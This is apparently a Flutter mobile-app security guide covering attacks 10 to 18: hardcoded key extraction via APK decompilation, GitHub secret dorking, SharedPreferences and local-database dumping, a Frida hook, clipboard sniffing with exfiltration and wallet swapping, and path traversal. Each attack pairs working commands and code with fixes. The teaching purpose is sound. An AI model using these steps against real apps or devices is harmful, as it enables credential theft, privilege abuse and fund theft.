+
+
+
+----------------------------------------------------------------------------
+
+
+
+
+ATTACK 10: HARDCODED API KEY EXPOSURE VIA APK DECOMPILATION**
+
+Description:
+Many Flutter apps embed **API keys**, secret tokens, or credentials directly inside the source code — often as constants or inside `.dart`, `.env`, or `.json` files. Once the APK is built and published, an attacker can **reverse-engineer the APK**, extract these secrets, and use them to abuse your backend services, payment gateways, Firebase, or analytics.
+
+---
+
+*Exploitation Steps
+
+1. Download the APK from your device or from a release link:
+
+```bash
+adb pull /data/app/com.example.myapp-1/base.apk ./target.apk
+```
+
+2. Decompile the APK using JADX (GUI or CLI):
+
+```bash
+jadx target.apk
+```
+
+3. Look for hardcoded strings in Dart or compiled resources:
+   Search for keys like:
+
+```
+AIzaSy...          // Google API Key
+sk_test_...        // Stripe Key
+eyJhbGci...        // JWT Token
+```
+
+4. Use extracted keys to:
+
+   * Access Firebase Realtime Database
+   * Send fake payment requests
+   * Query internal APIs
+
+---
+
+* Hack PoC: APK Decompilation and Key Extraction
+
+```bash
+jadx target.apk
+grep -r "AIza" jadx-output/
+grep -r "sk_test" jadx-output/
+```
+
+Or search manually in Decompiled Dart files:
+
+```
+lib/utils/constants.dart
+lib/config/env.dart
+assets/.env
+```
+
+---
+
+* Why This Works
+
+* Flutter compiles Dart to native binaries, but strings are still extractable.
+* Hardcoded keys become public once app is released.
+* These secrets often control access to critical infrastructure.
+
+---
+
+* Secure Fix: Remove All Hardcoded Keys
+
+ Don’t do this (vulnerable):
+
+```dart
+const apiKey = "sk_test_ABC123";
+```
+
+ Do this (safe):
+
+Store secrets securely on the **backend only**, and expose only endpoints with proper access control.
+
+ Optionally, use remote config + authentication:
+
+* Store secrets in **Firebase Remote Config**, **Supabase**, or custom backend.
+* Fetch it securely only after the user authenticates.
+
+---
+
+* Optional: Obfuscation for Mild Protection**
+
+If backendless is mandatory (e.g., public SDK), use Dart obfuscation (not a complete defense):
+
+```bash
+flutter build apk --obfuscate --split-debug-info=build/debug-info/
+```
+
+This makes string names unreadable but **doesn’t hide actual string values**.
+
+---
+
+* Risk Level: HIGH
+Once an API key is leaked, attackers can abuse your cloud account, use up billing quota, or bypass app controls entirely.
+
+---
+
+ Use a backend gateway
+ Never expose secrets to the frontend
+ Lock all cloud services to IPs, scopes, or user-based tokens
+
+
+----------------------------------------------------------------------
+
+
+
+ATTACK 11: FLUTTER API KEY LEAKAGE VIA STATIC REVERSE ENGINEERING
+
+---
+
+Description:
+
+Flutter apps often store **API keys, secrets, Firebase project IDs**, or 3rd-party credentials directly in the Dart code or `AndroidManifest.xml`. These get compiled into the `.apk` and can be easily extracted using tools like **`apktool`, `jadx`, `strings`, or `grep`**.
+
+Attackers can reverse engineer the APK and:
+
+*  Extract hardcoded API keys
+*  Access private APIs (e.g., Stripe, Firebase, SendGrid)
+*  Abuse paid services using leaked keys
+
+---
+
+# **Exploitation Steps (APK Reverse Walkthrough)**
+
+# Step 1: Download and decompile the APK
+
+```bash
+apktool d app-release.apk -o output
+```
+
+Or use JADX for GUI reverse:
+
+```bash
+jadx-gui app-release.apk
+```
+
+---
+
+# Step 2: Search for API keys and secrets
+
+```bash
+grep -r 'AIza' ./output/
+grep -r 'sk_live' ./output/
+grep -r 'firebaseio.com' ./output/
+```
+
+Typical leaks include:
+
+* Firebase Realtime DB
+* Google Maps API
+* Stripe `sk_live_` or `pk_test_` keys
+* Supabase project keys
+* Backend auth tokens
+
+---
+
+# Step 3: Abuse a Firebase key
+
+If you find:
+
+```js
+AIzaSyD8xyDxl8a9cA0_fake_example_2
+```
+
+Try:
+
+```bash
+curl "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyD8xyDxl8a9cA0_fake_example_2" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
+
+ If you get a 200 response with a token — that key is active and exploitable.
+
+---
+
+# Vulnerable Flutter Code (Common Mistake)
+
+```dart
+const String firebaseApiKey = "AIzaSyA1v29yFake_Real_Key";
+final String stripeKey = "sk_live_xxxxxxxxxxxxxxxxxx";
+```
+
+ These are stored in Dart → compiled → dumped in `.apk`.
+
+---
+
+# Why This Works
+
+* Flutter compiles Dart into native Android bytecode
+* Constants, strings, and config files are stored in `.dex`, `.xml`, or `.json`
+* Reverse engineering tools extract this easily
+* No runtime protection for static keys
+
+---
+
+# Secure Fix 1: Never Store Secrets in Client Code
+
+ Store sensitive keys **only on the backend**.
+Flutter should request tokens from a secure API, like:
+
+```dart
+final token = await http.get('https://api.yourapp.com/getToken');
+```
+
+---
+
+# Secure Fix 2: Use Firebase App Check
+
+If using Firebase, enable **App Check** to prevent requests from unauthorized clients — even if keys leak.
+
+* Detects fake apps, rooted devices
+* Blocks unauthenticated calls to Firebase
+
+Docs: [https://firebase.google.com/docs/app-check](https://firebase.google.com/docs/app-check)
+
+---
+
+# Secure Fix 3: Obfuscate Release Builds
+
+Run this in your `build.gradle`:
+
+```gradle
+release {
+  minifyEnabled true
+  shrinkResources true
+  proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+}
+```
+
+ Removes unused methods + renames strings (slightly harder to reverse).
+
+---
+
+# Secure Fix 4: Use Proxy APIs
+
+Instead of calling a 3rd-party API like Stripe or SendGrid directly from Flutter:
+
+ Route through your own backend:
+
+```dart
+// Flutter:
+await http.post('https://yourapi.com/pay', body: {'amount': 100});
+
+// Server (Node, Python):
+app.post('/pay', async (req, res) => {
+   const charge = await stripe.charges.create({...});
+});
+```
+
+ This hides your `sk_live_` from the attacker.
+
+---
+
+# Risk Level: **CRITICAL**
+
+Leaked API keys = full backend bypass, financial loss, service abuse, and app compromise.
+
+---
+
+# Summary
+
+|  Issue  | API keys hardcoded in Flutter/Dart/Manifest   |
+| --------- | --------------------------------------------- |
+|  Impact | Firebase abuse, payment fraud, backend bypass |
+|  Fix   | Use backend proxy, App Check, and obfuscation |
+
+
+---------------------------------------------------------------------
+
+
+ATTACK 12 – GitHub API Key Leaks via Open Repositories
+
+> *(This is one of the most common real-world Flutter dev mistakes — even senior devs have done this.)*
+
+---
+
+Description:
+
+Developers often accidentally commit sensitive files (like `google-services.json`, `.env`, Firebase keys, Stripe secrets, etc.) into public GitHub repos.
+These secrets are scanned by bots **within seconds**, harvested, and abused.
+
+Even if the app is secure, exposed keys = **bypass entire security**.
+
+---
+
+# Exploitation Walkthrough
+
+# Step 1: Find a Target Repo (or test your own)
+
+```bash
+# Use GitHub search to find exposed secrets:
+in:file firebase_api_key "apiKey" language:json
+in:file stripe "sk_live" language:env
+```
+
+# Step 2: Use `GitLeaks` or `TruffleHog` to scan
+
+```bash
+gitleaks detect --source . --report gitleaks-report.json
+```
+
+ Finds Firebase keys, AWS secrets, JWTs, and more in your own repo.
+
+# Step 3: Exploit
+
+If you find:
+
+```json
+{
+  "apiKey": "AIzaSyXXXXX",
+  "authDomain": "myapp.firebaseapp.com",
+  "projectId": "myapp"
+}
+```
+
+Use tools like [Firepwn](https://github.com/maikelnight/Firepwn) or Postman to:
+
+* Query Firestore (read/write without auth)
+* Trigger Firebase Auth flows
+* Hijack endpoints if security rules are weak
+
+ You now control part of the app backend, even if the Flutter app itself is obfuscated.
+
+---
+
+# Why It Works
+
+* Devs commit `.env`, `config.json`, `firebase_options.dart` by mistake
+* Attackers monitor `push` events on GitHub
+* Firebase, Stripe, and other APIs accept key-based auth without IP restriction
+* Git history (`git log`) often keeps secrets even after they are deleted
+
+---
+
+# **Fixes**
+
+# Fix 1: Add `.gitignore` for Secrets
+
+```bash
+# .gitignore
+.env
+google-services.json
+firebase_options.dart
+```
+
+#Fix 2: Use Git Hooks or Secrets Scanners
+
+* [GitLeaks](https://github.com/gitleaks/gitleaks)
+* [TruffleHog](https://github.com/trufflesecurity/trufflehog)
+* [GitGuardian](https://www.gitguardian.com/)
+
+ Block pushes with secrets automatically
+
+# Fix 3: Revoke and Rotate
+
+If a secret is exposed:
+
+```bash
+# Firebase
+Go to console → Project Settings → Regenerate Web API key
+
+# Stripe
+Dashboard → Developers → API Keys → Roll the key
+```
+
+Then re-deploy backend.
+
+# Fix 4: Use Backend Token Exchange
+
+Don’t call Stripe or Firestore directly from app using the key.
+
+❌ Bad:
+
+```dart
+final stripe = Stripe(apiKey: 'sk_live_XXXX');
+```
+
+✅ Good:
+
+```dart
+final ephemeralKey = await backend.getStripeEphemeralKey();
+```
+
+---
+
+### 🛡️ **Bonus – GitHub Dorking Cheat Sheet**
+
+| 🔍 Dork                          | 🔓 What it Finds         |
+| -------------------------------- | ------------------------ |
+| `filename:firebase.json`         | Firebase config          |
+| `filename:.env stripe`           | Stripe secrets           |
+| `filename:pubspec.yaml password` | Secrets in Flutter code  |
+| `filename:google-services.json`  | Firebase Android keys    |
+| `filename:firebase_options.dart` | Dart-based Firebase keys |
+
+---
+
+# Summary
+
+| 🔐 Vulnerability | Public repo secrets = backend takeover                        |
+| ---------------- | ------------------------------------------------------------- |
+| 💥 Impact        | Firestore hijack, Stripe abuse, auth bypass                   |
+| 🛠️ Fix          | Git ignore, secret scanning, token rotation, backend proxying |
+
+
+
+----------------------------------------------------------------------------
+
+
+
+ATTACK 13: FLUTTER SHARED PREFERENCES CREDENTIAL DUMP
+
+**(via Rooted Device Access or Frida Hooking)**
+
+---
+
+Description:
+
+Flutter developers commonly use `SharedPreferences` to store user tokens, email/passwords, and login flags — but on Android, `SharedPreferences` are stored as **unencrypted XML files in plaintext**.
+
+On **rooted devices**, attackers can easily extract this data or **hook it in memory** using **Frida** to steal tokens even during runtime.
+
+---
+
+# **Exploitation Steps (File Dump + Frida Memory Hook)**
+
+---
+
+# **Method 1: Direct XML Dump on Rooted Device**
+
+1. Install and open the target Flutter app
+2. Pull app’s data directory:
+
+```bash
+adb root
+adb shell
+cd /data/data/com.example.myapp/shared_prefs/
+cat FlutterSharedPreferences.xml
+```
+
+Example output:
+
+```xml
+<string name="flutter.email">admin@gmail.com</string>
+<string name="flutter.password">123456</string>
+<string name="flutter.token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>
+```
+
+ You now have full credentials.
+
+---
+
+# **Method 2: Frida Hooking on SharedPreferences Class**
+
+If the Flutter plugin uses native `SharedPreferences` (Android side), hook it with:
+
+```js
+Java.perform(function () {
+  var SharedPref = Java.use("android.app.SharedPreferencesImpl");
+  SharedPref.getString.overload('java.lang.String', 'java.lang.String').implementation = function (key, def) {
+    var value = this.getString(key, def);
+    console.log("[+] SharedPreferences[" + key + "] = " + value);
+    return value;
+  };
+});
+```
+
+ Frida will now log every key-value request from the app — including `flutter.token`, `flutter.email`, `flutter.password`.
+
+---
+
+# Vulnerable Flutter Code (Very Common)
+
+```dart
+final prefs = await SharedPreferences.getInstance();
+await prefs.setString("email", "admin@gmail.com");
+await prefs.setString("password", "123456");
+await prefs.setString("token", token);
+```
+
+ These are saved in unencrypted XML under `/data/data/.../shared_prefs/FlutterSharedPreferences.xml`
+
+---
+
+ Why This Works
+
+* SharedPreferences = **unencrypted local storage**
+* Android stores prefs in **world-readable files on rooted devices**
+* Frida can hook into native methods (`getString`) and steal values in **real time**
+* Dart devs often store **auth tokens or user passwords** directly
+
+---
+
+# Secure Fix 1: Don’t Store Credentials in SharedPreferences
+
+ Only store short-lived, **non-sensitive** values in SharedPreferences (e.g., `themeMode`, `isFirstTimeUser`)
+
+ Avoid:
+
+```dart
+prefs.setString("token", jwt);
+prefs.setString("password", "123456");
+```
+
+ Use secure alternatives.
+
+---
+
+# Secure Fix 2: Use EncryptedSharedPreferences (Android)
+
+If you must store data locally:
+
+```yaml
+dependencies:
+  flutter_secure_storage: ^9.0.0
+```
+
+Then:
+
+```dart
+final secureStorage = FlutterSecureStorage();
+await secureStorage.write(key: "token", value: token);
+```
+
+ Uses AES encryption + Android Keystore — no plain XML files.
+
+---
+
+# Secure Fix 3: Detect Rooted Devices
+
+Use a plugin like:
+
+```yaml
+dependencies:
+  root_detector: ^1.0.0
+```
+
+```dart
+bool rooted = await RootDetector.isDeviceRooted;
+if (rooted) {
+  exit(1); // or disable login
+}
+```
+
+ Block execution or disable login on rooted/emulated environments.
+
+---
+
+# Bonus Fix: Self-Destruct Token on Logout
+
+Clear tokens on logout:
+
+```dart
+await prefs.remove("token");
+```
+
+ Reduces window of exposure if device is lost or rooted later.
+
+---
+
+# Risk Level: CRITICAL
+
+Plaintext SharedPreferences = **token dump, password recovery, session hijack, privilege escalation** on rooted or emulated devices.
+
+---
+
+# Summary
+
+|  Vulnerability | Flutter stores credentials in SharedPreferences (plaintext) |
+| ---------------- | ----------------------------------------------------------- |
+|  Impact        | Tokens & passwords stolen from file or Frida hook           |
+|  Fix          | Use secure storage, detect root, never store credentials    |
+
+
+
+--------------------------------------------------------------------------
+
+
+
+ATTACK 14: SHARED PREFERENCES STORAGE ABUSE
+
+**(Steal, modify, or forge session/token data)**
+
+---
+
+Description:
+
+`SharedPreferences` is often used to persist:
+
+* JWT access tokens
+* User roles like `isAdmin = true`
+* Session flags like `loggedIn = true`
+* Payment status flags (e.g., `premium = true`)
+
+These are stored **unencrypted** in plaintext `.xml` files inside app storage:
+
+```
+/data/data/com.yourapp.name/shared_prefs/FlutterSharedPreferences.xml
+```
+
+ On rooted devices — or emulators — this file can be **read, modified, or replaced**.
+
+---
+
+# Exploitation Steps — Token Theft / Role Forging
+
+---
+
+# Step 1: Install the App and Login
+
+Let the app save your session:
+
+```dart
+await SharedPreferences.getInstance()
+  ..setString("accessToken", token)
+  ..setBool("isAdmin", true);
+```
+
+---
+
+# Step 2: Access the App Storage via ADB (Rooted Device or Emulator)
+
+```bash
+adb root
+adb shell
+cd /data/data/com.yourapp.name/shared_prefs/
+cat FlutterSharedPreferences.xml
+```
+
+ Reveals content like:
+
+```xml
+<string name="flutter.accessToken">eyJhbGciOiJIUzI1NiIs...</string>
+<boolean name="flutter.isAdmin" value="true"/>
+```
+
+---
+
+# Step 3: Modify the File to Escalate Privileges
+
+Edit the XML:
+
+```xml
+<boolean name="flutter.isAdmin" value="true"/>
+```
+
+Or insert your own token:
+
+```xml
+<string name="flutter.accessToken">fake-admin-token</string>
+```
+
+ Next time app reads this: you're now “admin”.
+
+---
+
+# Bonus: Scripted Tampering
+
+```bash
+adb push modified_prefs.xml /data/data/com.yourapp.name/shared_prefs/FlutterSharedPreferences.xml
+adb shell chmod 660 /data/data/.../FlutterSharedPreferences.xml
+```
+
+ Automate privilege escalation on emulators or rooted phones.
+
+---
+
+# Why This Works
+
+* `SharedPreferences` is **not encrypted**
+* No signature validation on tokens or flags
+* App trusts local storage blindly
+* Attackers can replace values with forged data
+* No checksum, HMAC, or backend validation
+
+---
+
+# Vulnerable Dart Code
+
+```dart
+final prefs = await SharedPreferences.getInstance();
+if (prefs.getBool("isAdmin") == true) {
+  showAdminPanel();
+}
+```
+
+ No backend check = full privilege abuse.
+
+---
+
+# Secure Fix 1: Never Store Sensitive Flags Locally
+
+Do **not** persist:
+
+* isAdmin
+* isPaid
+* accessToken (for long durations)
+
+Instead: store in secure, ephemeral memory and validate via backend.
+
+---
+
+# Secure Fix 2: Use Backend Validation for All Auth Checks
+
+Instead of:
+
+```dart
+if (prefs.getBool("isPremium")) unlockFeatures();
+```
+
+Do this:
+
+```dart
+final response = await http.get("https://yourapi.com/check-access");
+if (response.statusCode == 200 && response.data.isPremium) {
+  unlockFeatures();
+}
+```
+
+ Backend-controlled logic = unforgeable.
+
+---
+
+# Secure Fix 3: Encrypt Local Storage with AES
+
+Use a plugin like:
+
+* [`flutter_secure_storage`](https://pub.dev/packages/flutter_secure_storage)
+* Or manually encrypt values:
+
+```dart
+final key = await getEncryptionKey();
+final encryptedToken = encryptAES(token, key);
+prefs.setString("accessToken", encryptedToken);
+```
+
+ Requires native support + proper key protection.
+
+---
+
+# Secure Fix 4: Token Expiry + Rotation
+
+* Always store **short-lived tokens**
+* Backend should reject old tokens after logout/device change
+* Use refresh token logic that requires re-auth
+
+---
+
+# Risk Level: VERY HIGH
+
+SharedPreferences = plain XML, no access control or validation.
+
+---
+
+# Summary
+
+|  Vulnerability | Unprotected session/tokens in `SharedPreferences`        |
+| ---------------- | -------------------------------------------------------- |
+|  Impact        | Admin bypass, token reuse, fake premium access           |
+|  Fix          | Encrypt storage, validate via backend, avoid local flags |
+
+
+
+------------------------------------------------------------------------
+
+
+
+ATTACK 15: FLUTTER LOCAL DATABASE DUMP
+
+**(Exfiltrate or manipulate `.db`, `.hive`, `.sqlite` files directly)**
+
+---
+
+Description:
+
+Flutter apps using local databases like **Hive**, **SQFlite**, **Moor/Drift**, or **Isar** store files on disk in predictable locations. On **rooted devices** or using **backup bypass tricks**, attackers can:
+
+* Steal `.db` or `.hive` files
+* Read/export all user data
+* Inject malicious values (e.g., isAdmin=true)
+* Reset tokens or override app behavior
+* Re-sign modified app and install it with forged local state
+
+---
+
+# Exploitation Steps — Local DB Dump & Tamper
+
+---
+
+# Step 1: Locate DB Files (Typical Paths)
+
+* **SQFlite**:
+  `/data/data/com.example.myapp/databases/app.db`
+
+* **Hive**:
+  `/data/data/com.example.myapp/files/hive/box.hive`
+
+* **Moor (Drift)**:
+  Same as SQFlite → `.sqlite` file
+
+---
+
+# Step 2: Pull DB File (Rooted ADB)
+
+```bash
+adb root
+adb shell
+cd /data/data/com.example.myapp/databases/
+cp app.db /sdcard/app.db
+exit
+adb pull /sdcard/app.db
+```
+
+ You now have the full app database on your system.
+
+---
+
+# Step 3: Read / Inject
+
+Use DB browser tools:
+
+```bash
+sqlite3 app.db
+```
+
+```sql
+SELECT * FROM users;
+UPDATE users SET is_admin = 1 WHERE email = 'victim@gmail.com';
+```
+
+For Hive:
+
+```bash
+hexdump -C box.hive
+```
+
+Or decode Hive using Flutter:
+
+```dart
+var box = await Hive.openBox('user');
+print(box.values);
+```
+
+ You can now steal sessions, elevate access, or change stored values.
+
+---
+
+# Vulnerable Flutter Usage (SQFlite Example)
+
+```dart
+final db = await openDatabase('app.db');
+await db.insert('users', {
+  'email': 'admin@gmail.com',
+  'is_admin': false
+});
+```
+
+ These values are stored in `app.db` — readable and writable by attackers with access.
+
+---
+
+# Why This Works
+
+* Local DBs are stored as files in private app directories
+* Rooted devices or misconfigured backups expose them
+* Flutter apps don’t encrypt DBs by default
+* Devs assume local DB = “safe” → but **nothing on disk is safe**
+
+---
+
+# Secure Fix 1: Use Encrypted DBs (SQLCipher / Hive Encryption)
+
+# For SQFlite:
+
+Use `sqflite_sqlcipher`:
+
+```yaml
+dependencies:
+  sqflite_sqlcipher: ^3.0.0
+```
+
+```dart
+final db = await openDatabase(
+  'encrypted.db',
+  password: 'securePassword123!'
+);
+```
+
+ Encrypts database file using AES.
+
+---
+
+# 🔐 For Hive:
+
+```dart
+final key = Hive.generateSecureKey(); // Store in secure storage
+final box = await Hive.openBox('userBox', encryptionCipher: HiveAesCipher(key));
+```
+
+ Prevents hex or file parsing attacks.
+
+---
+
+# Secure Fix 2: Detect Root Before Opening DB
+
+```dart
+if (await RootCheck.isRooted) exit(0);
+```
+
+ Don’t even let app open if device is compromised.
+
+---
+
+# Secure Fix 3: Obfuscate Schema or Store Critical Data Remotely
+
+Avoid storing `isAdmin`, `token`, or `purchaseAccess` flags locally:
+
+```dart
+final access = await backend.getAccessLevel();
+```
+
+ Server-controlled data = hard to forge locally.
+
+---
+
+# Secure Fix 4: Hash Sensitive Data
+
+Instead of storing plain text email/passwords:
+
+```dart
+final hashedPass = sha256.convert(utf8.encode("userpassword"));
+await db.insert("users", {"email": "admin@gmail.com", "pass": hashedPass.toString()});
+```
+
+ Makes stolen DB less useful even if dumped.
+
+---
+
+ Risk Level: HIGH
+
+Local DB dump = full data exfiltration, session hijack, privilege escalation.
+
+---
+
+# Summary
+
+|  Vulnerability | Flutter DB files (Hive, SQFlite) are dumped & manipulated  |
+| ---------------- | ---------------------------------------------------------- |
+|  Impact        | Session theft, admin privilege spoofing, user data leak    |
+|  Fix          | Encrypt DB, detect root, offload critical logic to backend |
+
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 16: CLIPBOARD SNIFFING & HIJACKING
+
+**(Read or replace copied content like passwords or wallets)**
+
+---
+
+Description:
+
+Flutter provides full access to the system clipboard using:
+
+```dart
+Clipboard.getData(Clipboard.kTextPlain);
+Clipboard.setData(ClipboardData(text: "replaced"));
+```
+
+There are **no user permissions** required for this.
+
+ Any app — at any time — can read what the user last copied, including passwords, OTPs, or wallet keys.
+
+---
+
+# Exploitation Steps – Clipboard Spy & Replace
+
+---
+
+# Step 1: Read Clipboard (Silent Sniffing)
+
+```dart
+final clipboard = await Clipboard.getData(Clipboard.kTextPlain);
+print("User copied: ${clipboard?.text}");
+```
+
+ On app open or in background, attacker logs:
+
+```
+[*] Clipboard = sk_live_abc123...
+[*] Clipboard = 0x8dCFa2... (Ethereum wallet)
+```
+
+---
+
+# Step 2: Replace Clipboard (Phishing Attack)
+
+```dart
+await Clipboard.setData(ClipboardData(
+  text: "0xFAKE_ADDR_FOR_PHISHING",
+));
+```
+
+ Attacker replaces crypto wallet or payment link.
+
+Victim pastes the wrong value — attacker gets funds.
+
+---
+
+# Bonus: Auto Polling Clipboard in Background
+
+Use a loop:
+
+```dart
+Timer.periodic(Duration(seconds: 2), (_) async {
+  final data = await Clipboard.getData(Clipboard.kTextPlain);
+  if (data?.text?.contains("sk_") == true) {
+    sendToServer(data.text);
+  }
+});
+```
+
+ Fully automated clipboard spy.
+
+---
+
+ Why This Works
+
+* Flutter clipboard access = **no runtime permission required**
+* No Android/iOS clipboard access logs or UI prompts
+* Users often copy sensitive content
+* App can **access clipboard any time**, even on background resume
+
+---
+
+# Vulnerable Dart Code (if misused)
+
+```dart
+@override
+void initState() {
+  super.initState();
+  Clipboard.getData(Clipboard.kTextPlain).then((value) {
+    sendToServer(value?.text);
+  });
+}
+```
+
+ Can be triggered even if user didn’t paste anything.
+
+---
+
+ Secure Fix 1: Never Read Clipboard Without User Consent
+
+Show confirmation:
+
+```dart
+ElevatedButton(
+  onPressed: () async {
+    final data = await Clipboard.getData(Clipboard.kTextPlain);
+    if (data != null) {
+      showDialog(...); // ask permission to use it
+    }
+  },
+  child: Text("Paste from clipboard"),
+)
+```
+
+ Prevents silent abuse.
+
+---
+
+ Secure Fix 2: Don’t Auto Paste Sensitive Inputs
+
+Avoid:
+
+```dart
+final value = await Clipboard.getData(Clipboard.kTextPlain);
+_controller.text = value.text;
+```
+
+ Only paste when user taps a **visible action**.
+
+---
+
+# Secure Fix 3: Wipe Sensitive Clipboard Content
+
+After copy action:
+
+```dart
+Clipboard.setData(ClipboardData(text: ""));
+```
+
+ Removes secrets like 2FA codes or tokens **after 5 seconds**.
+
+---
+
+# Secure Fix 4: Use Secure Paste Zone
+
+For password or 2FA fields:
+
+* Don’t paste unless user **taps paste**
+* Use **custom paste UI** instead of auto-filling
+
+---
+
+# Risk Level: HIGH
+
+Clipboard sniffing = password theft, token exposure, wallet hijacking.
+
+---
+
+# Summary
+
+|  Vulnerability | Flutter app reads or modifies system clipboard silently |
+| ---------------- | ------------------------------------------------------- |
+|  Impact        | Secrets exfiltration, phishing attacks, fund theft      |
+|  Fix          | Prompt user for paste, clear clipboard, avoid auto-read |
+
+
+---------------------------------------------------------------------
+
+
+
+ATTACK 17: FLUTTER CLIPBOARD HIJACK
+
+**(Capture OTPs, passwords, wallet keys copied by users)**
+
+---
+
+Description:
+
+Users often **copy-paste sensitive data** — like:
+
+* OTPs from SMS apps
+* Passwords from password managers
+* Crypto wallet addresses
+* Referral codes
+* Session tokens
+
+Attackers can build apps (or abuse Flutter apps) to **listen to clipboard content**, silently reading data the user copies from any app.
+
+Even legit Flutter apps are vulnerable if:
+
+* They copy sensitive info into the clipboard
+* They don’t clear it afterwards
+* Other apps on the device are listening
+
+---
+
+# Exploitation Steps — Hijacking Clipboard on Android
+
+---
+
+# Step 1: Install a Malicious App with Clipboard Access
+
+Even without any permissions, an app can read the clipboard like this (in Java):
+
+```java
+ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+ClipData clip = clipboard.getPrimaryClip();
+if (clip != null && clip.getItemCount() > 0) {
+    String copiedText = clip.getItemAt(0).coerceToText(this).toString();
+    Log.d("SPY", "Copied: " + copiedText);
+}
+```
+
+ No special permission needed on Android < 10
+ On Android 10+, access still works if app is in **foreground**
+
+---
+
+# Step 2: Wait for User to Copy OTP or Password
+
+When user does:
+
+```dart
+Clipboard.setData(ClipboardData(text: otpCode));
+```
+
+ Attacker’s app instantly captures the content.
+
+---
+
+# Bonus: Clipboard Replacement (Injection)
+
+Some malware modifies the clipboard instead:
+
+```java
+clipboard.setPrimaryClip(ClipData.newPlainText("label", "attacker-wallet-address"));
+```
+
+ Used in **crypto attacks** to hijack wallet transfers.
+
+---
+
+# Vulnerable Flutter Usage
+
+```dart
+Clipboard.setData(ClipboardData(text: 'SECRET_OTP_491920'));
+```
+
+Or:
+
+```dart
+Clipboard.getData('text/plain').then((value) => print(value?.text));
+```
+
+ If used carelessly, this exposes secrets to clipboard-hijacking malware.
+
+---
+
+# Why This Works
+
+* Clipboard is **shared across all apps** (Android/iOS)
+* No permission required to access it in foreground
+* Flutter apps may copy sensitive info and forget to clear it
+* Attacker apps can **poll the clipboard constantly**
+
+---
+
+# Secure Fix 1: Don’t Copy Sensitive Data
+
+Avoid copying:
+
+* Passwords
+* OTPs
+* Session tokens
+* Access keys
+
+ Show them in read-only text fields instead.
+
+---
+
+# Secure Fix 2: Auto-Clear Clipboard After Copy
+
+Use a `Timer` to clear clipboard after a few seconds:
+
+```dart
+await Clipboard.setData(ClipboardData(text: '491920')); // OTP
+Future.delayed(Duration(seconds: 10), () {
+  Clipboard.setData(ClipboardData(text: ''));
+});
+```
+
+ Great for security + user protection.
+
+---
+
+ Secure Fix 3: Detect Clipboard Access Abuse
+
+There’s no direct API to detect who accessed the clipboard, but you can:
+
+* Warn users if device has suspicious apps
+* Detect background services scanning data
+* Use Play Protect APIs or AppCheck in Firebase
+
+---
+
+# Secure Fix 4: Mask Displayed Data
+
+Instead of:
+
+```dart
+Clipboard.setData(ClipboardData(text: fullToken));
+```
+
+Use:
+
+```dart
+Clipboard.setData(ClipboardData(text: maskedToken.substring(0, 4) + "****"));
+```
+
+ Prevents attackers from capturing full value even if clipboard is read.
+
+---
+
+# Secure Fix 5: Obfuscate Internal Copying
+
+You can also encode it:
+
+```dart
+final secret = base64Encode(utf8.encode("OTP_491920"));
+Clipboard.setData(ClipboardData(text: secret));
+```
+
+✅ Requires decoding to make sense — adds basic protection.
+
+---
+
+ Risk Level: MEDIUM → HIGH
+
+Clipboard hijack = silent data theft with no user awareness.
+
+---
+
+### ✅ Summary
+
+|  Vulnerability | Sensitive data copied to global clipboard                  |
+| ---------------- | ---------------------------------------------------------- |
+|  Impact        | OTP/token/password theft, crypto hijack                    |
+|  Fix          | Auto-clear clipboard, avoid copying secrets, detect misuse |
+
+
+
+----------------------------------------------------------------------------
+
+
+
+
+ATTACK 18: FILE PATH TRAVERSAL IN FLUTTER
+
+**(Abuse file read/write APIs to access or overwrite critical files)**
+
+---
+
+Description:
+
+Flutter apps use plugins like:
+
+* `path_provider`
+* `dart:io`
+* `file_picker`
+* `flutter_file_dialog`
+
+If the app allows **user-supplied paths** or filenames without sanitization, attackers can traverse directories using `../` or absolute paths:
+
+```
+../../../../data/data/com.other.app/databases/user.db  
+/data/user/0/com.myapp/files/.env
+```
+
+This enables:
+
+* Reading secure config files
+* Accessing token storage
+* Overwriting internal files
+* Directory structure reconnaissance
+
+---
+
+# Exploitation Steps — File Access Abuse
+
+---
+
+# Step 1: App Lets User Pick or Specify Path
+
+```dart
+final file = File("/data/data/com.myapp/files/${userInput}");
+final contents = await file.readAsString();
+```
+
+ If `userInput = "../../user.db"` — attacker reads outside allowed path.
+
+---
+
+# Step 2: Exploit Path Traversal
+
+If the app saves a log file like:
+
+```dart
+File("${dir.path}/${logFileName}")
+  .writeAsString("Crash log...");
+```
+
+Attacker sets:
+
+```dart
+logFileName = "../../../data/leak.txt"
+```
+
+ App writes to `data/leak.txt` — unintentional overwrite.
+
+---
+
+# Step 3: Leak SQLite DB, Token, or Key File
+
+Find these common targets:
+
+| File                                                             | Risk                |
+| ---------------------------------------------------------------- | ------------------- |
+| `/data/data/com.myapp/databases/app.db`                          | leaks user data     |
+| `/data/data/com.myapp/shared_prefs/FlutterSharedPreferences.xml` | exposes tokens      |
+| `/data/user/0/com.myapp/files/env.json`                          | may contain secrets |
+
+---
+
+# Why This Works
+
+* Flutter’s `dart:io` `File`, `Directory` don’t restrict paths
+* Path traversal (`../`) isn't automatically blocked
+* No sandbox enforcement inside your app's file space
+* User input isn't sanitized when passed into file constructors
+* Rooted devices = full access to exploit consequences
+
+---
+
+# Vulnerable Dart Code
+
+```dart
+Future<String> readUserFile(String fileName) async {
+  final path = "/data/data/com.myapp/files/$fileName";
+  return File(path).readAsString();
+}
+```
+
+ If `fileName = "../../../../etc/passwd"` — path traversal attack.
+
+---
+
+# Secure Fix 1: Always Use Safe Join & Validate Filename
+
+Use `path` package to normalize:
+
+```dart
+import 'package:path/path.dart' as p;
+
+final safePath = p.normalize(p.join(basePath, userInput));
+if (!safePath.startsWith(basePath)) {
+  throw Exception("Illegal file path");
+}
+```
+
+ Prevents traversal outside allowed directory.
+
+---
+
+# Secure Fix 2: Whitelist File Extensions or Names
+
+```dart
+if (!fileName.endsWith(".txt")) {
+  throw Exception("Invalid file format");
+}
+```
+
+ Prevents access to unexpected or sensitive files.
+
+---
+
+# Secure Fix 3: Never Let User Control Full File Path
+
+Avoid:
+
+```dart
+File(userSuppliedPath).readAsString();
+```
+
+ Instead: only let them choose from predefined safe files.
+
+---
+
